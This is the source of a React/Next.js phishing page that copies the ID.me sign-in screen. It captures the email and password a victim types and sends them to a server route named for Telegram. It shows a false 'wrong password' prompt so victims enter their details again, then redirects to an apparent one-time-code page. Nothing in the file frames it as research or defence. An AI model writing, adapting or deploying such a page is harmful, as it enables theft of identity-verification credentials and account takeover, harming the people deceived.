"use client";
import './styles.css';
import Image from 'next/image';
import idmeLogo from './idme.png';
import { useState } from "react";

const SignInForm = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!email || !password) {
      setError("Please fill out both email and password fields.");
      return;
    }

    const message = `
New user sign-in attempt:
Email: ${email}
Password: ${password}
    `;

    try {
      // ✅ Secure API call to server-side Telegram route
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message }),
      });

      if (!response.ok) {
        throw new Error("Telegram message failed.");
      }

      // ✅ Continue
      setEmail("");
      setPassword("");
      setError("");
      setSuccess("Sign-in attempt logged successfully!");
      window.location.href = "/idmeotp";
    } catch (error) {
      console.error(error);
      setError("Failed to log sign-in attempt. Please try again.");
    }
  };

  return (
    <div className="page-container">
      <div className="container">
        <div className="content-container">
          <form className="new_user" id="new_user" onSubmit={handleSubmit}>
            <div className="form-header">
              <div className="form-header-content" role="banner">
                <div className="partner">
                  <div className="c_icon m_idme">
                    <Image alt="ID.me" width={120} height={40} src={idmeLogo} />
                  </div>
                </div>
              </div>
            </div>

            <main aria-labelledby="sr_page_title" className="form-container">
              <div className="form-header-access">
                <h1 id="sr_page_title">Sign in to ID.me</h1>
              </div>

              <div className="form-header-well">
                <div>
                  <p style={{ color: "red", textAlign: "center" }}>
                    Wrong username or password. Please try again.
                  </p>
                </div>
                <p>
                  <a target="_blank" href="https://cutt.ly/xPJZ0xv">Create an ID.me account</a>
                </p>
              </div>

              {error && (
                <p className="alert alert-error" role="alert">{error}</p>
              )}
              {success && (
                <p className="alert alert-success" role="alert">{success}</p>
              )}

              <div className="form-fields">
                <div className="field-group">
                  <div className="field text">
                    <label htmlFor="user_email">Email</label>
                    <input
                      placeholder="Enter your email"
                      required
                      type="email"
                      name="email"
                      id="user[email]"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                    />
                  </div>
                  <div className="field text">
                    <label htmlFor="user_password">Password</label>
                    <input
                      placeholder="Enter your password"
                      required
                      type="password"
                      name="password"
                      id="user[password]"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                  </div>
                </div>
              </div>

              <div className="form-actions">
                <input
                  id="but"
                  type="submit"
                  name="commit"
                  value="Sign in to ID.me"
                  className="btn btn-primary"
                />
              </div>
            </main>
          </form>

          <div className="form-footer">
            <p><a href="#">Forgot password</a></p>
          </div>
        </div>
      </div>

      <footer className="footer" role="contentinfo">
        <div className="footer-links">
          <a target="_blank" href="https://www.id.me/about">What is ID.me?</a> |
          <a target="_blank" href="https://www.id.me/terms">Terms of Service</a> |
          <a target="_blank" href="https://www.id.me/privacy">Privacy Policy</a>
        </div>
      </footer>
    </div>
  );
};

export default SignInForm;
